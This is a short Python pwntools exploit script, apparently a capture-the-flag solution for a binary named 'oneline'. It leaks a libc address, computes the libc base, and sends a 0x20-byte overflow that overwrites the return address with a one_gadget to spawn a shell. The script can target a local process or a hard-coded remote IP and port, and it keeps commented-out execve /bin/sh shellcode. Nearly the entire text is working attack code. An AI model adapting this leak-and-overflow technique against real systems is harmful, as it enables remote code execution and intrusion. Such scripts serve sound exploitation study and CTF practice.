from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

#execve(2) on x64

#shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62'\
#			 '\x69\x6e\x2f\x2f\x73\x68\x50\x48'\
#			 '\x89\xe7\x52\x57\x48\x89\xe6\x48'\
#			 '\x8d\x42\x3b\x0f\x05'
				
HOST = "153.120.129.186"
PORT = 10000 
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process('./oneline')

write_off = 0x110140
one_gadget = 0x10a38c


conn.recvuntil(">> ")
payload = "AAAA"

conn.send(payload)
conn.recv(0x20)

write_libc = u64(conn.recv(8))
libc_base = write_libc - write_off

one_gadget = libc_base + one_gadget

conn.recvuntil(">> ")
payload = "A"*0x20
payload += p64(one_gadget)

conn.send(payload)

conn.interactive()

